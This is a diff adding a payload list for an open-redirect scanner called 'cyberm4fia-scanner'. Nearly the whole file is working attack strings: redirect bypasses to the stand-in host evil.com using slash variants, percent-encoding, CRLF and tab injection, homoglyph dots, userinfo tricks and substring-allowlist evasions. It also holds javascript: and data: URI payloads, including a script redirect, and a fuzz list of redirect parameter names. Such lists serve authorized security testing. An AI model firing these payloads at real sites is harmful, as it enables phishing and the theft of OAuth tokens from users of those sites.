@@ -1,0 +1,41 @@
+# Open Redirect Payloads — cyberm4fia-scanner
+# Categories: URL Schemes, Bypass, Parameters, OAuth Chain
+
+# ─── Core Payloads ───
+//evil.com
+///evil.com
+////evil.com
+/\/\evil.com
+https:evil.com
+https:%5c%5cevil.com
+//evil.com/%2e%2e
+//evil.com%2F.target.com
+//target.com@evil.com
+//target.com%252F@evil.com
+
+# ─── Special Characters ───
+/%0d%0a/evil.com
+/%09/evil.com
+//evil.com%23.target.com
+//evil.com%3f.target.com
+//evil.com%2e
+//evil%E3%80%82com
+//evil%EF%BC%8Ecom
+//xn--evil-xyz.com
+
+# ─── javascript: / data: ───
+javascript://target.com/%0aalert(1)
+data:text/html,<script>location='https://evil.com'</script>
+
+# ─── Parameter Names (fuzzlist) ───
+url, next, redirect, redirect_uri, redirect_url, return, return_to
+returnUrl, rurl, dest, destination, continue, continueUrl, go, forward
+target, to, callback, callback_url, checkout_url, success_url
+cancel_url, origin, ref, referrer, image_url, jump, login_url, logout_url
+
+# ─── Allowlist-of-substrings Bypass ───
+https://evil.com/?target.com
+https://evil.com#target.com
+https://evil.com?x=target.com
+https://target.com.evil.com
+https://eviltarget.com
